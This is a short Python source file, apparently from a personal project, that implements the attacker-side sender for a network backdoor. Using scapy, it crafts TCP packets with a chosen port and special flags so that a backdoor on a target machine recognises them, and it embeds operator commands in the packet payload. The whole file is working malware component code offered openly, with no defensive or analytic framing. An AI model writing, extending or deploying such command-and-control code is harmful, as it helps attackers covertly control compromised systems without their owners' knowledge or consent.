"""
Author: R3tr0_H4ck
Date: 25/11/2023
Purpose: Holds the packet sending opertion of the backdoor in the attacking side
"""
from scapy.all import *
import random

import consts

class AttackerPacketSender:
	"""
	holds the operation of packet building and sending
	"""

	def __init__(self, dst, sending_port=consts.SENDING_PORT, sending_flags=consts.SENDING_FLAG_VALUE):
		"""
		:param: dst is the destination IP
		:param: sending_port is the port the backdoor listens to
		:param: sending_flags is the flags suppose to be in the packet so the backdoor will notice the packet
		"""
		self.sending_port = sending_port
		self.sending_flags = sending_flags
		self.dst = dst


	def send_packet(self, data: str):
		"""
		sends a packet with the rules for the backdoor to respond
		:param: data is the command you want to send to the backdoor
		"""
		sending_packet = IP(dst=self.dst) / TCP(flags=self.sending_flags, dport=self.sending_port, seq=random.randint(0,3000)) / data.encode()
		send(sending_packet)